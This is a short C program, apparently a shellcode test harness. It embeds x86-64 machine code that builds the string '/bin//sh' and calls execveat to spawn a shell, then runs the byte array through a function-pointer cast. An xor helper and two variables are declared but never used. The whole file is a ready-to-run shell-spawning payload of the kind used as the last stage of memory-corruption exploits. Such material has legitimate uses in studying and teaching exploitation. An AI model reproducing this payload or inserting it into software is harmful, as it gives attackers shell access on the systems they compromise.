#include <stdio.h>

char xor(char buf[], unsigned int size) {
    char cur = 0;
    unsigned int i;

    for (i = 0; i < size; i++)
    {
        cur ^= buf[i];
    }

    return cur;
}

int main(void)
{
    char first;
    char second;
    char shellcode[] =
    "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05\x3a";
 
    (*(void (*)()) shellcode)();
     
    return 0;
}
